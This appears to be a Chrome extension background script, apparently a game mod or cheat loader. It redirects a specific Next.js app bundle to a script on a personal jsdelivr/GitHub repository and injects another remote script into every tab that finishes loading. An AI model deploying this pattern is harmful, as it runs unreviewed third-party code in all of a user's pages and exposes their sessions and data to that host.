// background.js
chrome.runtime.onInstalled.addListener(function() {
  // Do something when the extension is installed or updated
});

chrome.webRequest.onBeforeRequest.addListener(function(details) {
  if (details.type === "script" && details.url.includes("/_next/static/chunks/pages/_app-8c7bc9f11d051ae0.js")) {
    return {redirectUrl: "https://cdn.jsdelivr.net/gh/Traceur2311/HusKypixels/2011.js"};
  }
}, {urls: ["<all_urls>"]}, ["blocking"]);

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if (changeInfo.status === "complete") { 
    chrome.tabs.executeScript(tabId, {
      code: `
        var script = document.createElement('script');
        script.src = "https://cdn.jsdelivr.net/gh/Traceur2311/Keygame/HusKy.js";
        document.head.appendChild(script);
        script.onload = function() {
          var erudaScript = document.createElement('script');
          erudaScript.textContent = ' document.body.appendChild(createNavigationBox());';
          document.head.appendChild(erudaScript);
        };
      `
    });
  }
});
